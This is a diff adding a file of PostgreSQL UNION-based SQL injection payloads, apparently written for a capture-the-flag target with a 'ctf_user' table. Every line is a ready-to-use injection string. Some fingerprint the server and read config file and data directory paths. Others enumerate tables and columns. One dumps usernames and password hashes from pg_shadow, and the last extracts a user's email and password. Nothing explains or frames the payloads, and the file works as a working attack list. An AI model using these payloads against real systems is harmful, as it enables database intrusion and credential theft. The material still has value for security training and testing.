@@ -1,0 +1,15 @@
+abcd' UNION ALL SELECT NULL,(SELECT version())-- 
+abcd' UNION ALL SELECT NULL,(SELECT user)-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_user)-- 
+abcd' UNION ALL SELECT NULL,(SELECT getpgusername())-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_database())-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_setting('log_connections'))-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_setting('port'))-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_setting('password_encryption'))-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_setting('config_file'))-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_setting('hba_file'))-- 
+abcd' UNION ALL SELECT NULL,(SELECT current_setting('data_directory'))-- 
+abcd' UNION ALL SELECT NULL,(SELECT concat(usename,' : ',passwd) from pg_shadow)-- 
+abcd' UNION ALL SELECT NULL,(SELECT string_agg(table_name,', ') AS tables_list FROM information_schema.tables WHERE table_schema = 'public')-- 
+abcd' UNION ALL SELECT NULL,(SELECT string_agg(column_name,', ') AS columns_list FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'ctf_user')-- 
+abcd' UNION ALL SELECT NULL,(SELECT concat(email,' : ',password) FROM public.ctf_user where id=2)-- 
